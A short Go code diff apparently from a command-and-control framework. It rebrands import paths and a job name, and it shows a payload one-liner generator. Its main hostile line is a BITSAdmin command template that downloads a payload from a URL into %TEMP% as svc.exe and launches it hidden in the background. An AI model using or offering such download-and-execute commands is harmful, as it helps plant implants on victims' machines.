@@ -10,8 +10,8 @@ import (
 	"sync"
 	"time"
 
-	"github.com/forgec2/forgec2/internal/db"
-	"github.com/forgec2/forgec2/internal/obfuscation"
+	"github.com/r0si/sovereign/internal/db"
+	"github.com/r0si/sovereign/internal/obfuscation"
 )
 
 // implantC2Schemes is the set of transports the generated agents understand.
@@ -304,7 +304,7 @@ func buildOneLinersWithObfuscation(payloadType, ps1Code, payloadURL, hostPath, p
 			Name: "BITSAdmin",
 			Desc: "Background download via BITSAdmin and execute",
 			Command: fmt.Sprintf(
-				`bitsadmin /transfer forgec2 /download /priority high %s %%TEMP%%\\svc.exe & start /b %%TEMP%%\\svc.exe`,
+				`bitsadmin /transfer sovereign /download /priority high %s %%TEMP%%\\svc.exe & start /b %%TEMP%%\\svc.exe`,
 				payloadURL),
 		})
 		items = append(items, oneLinerItem{
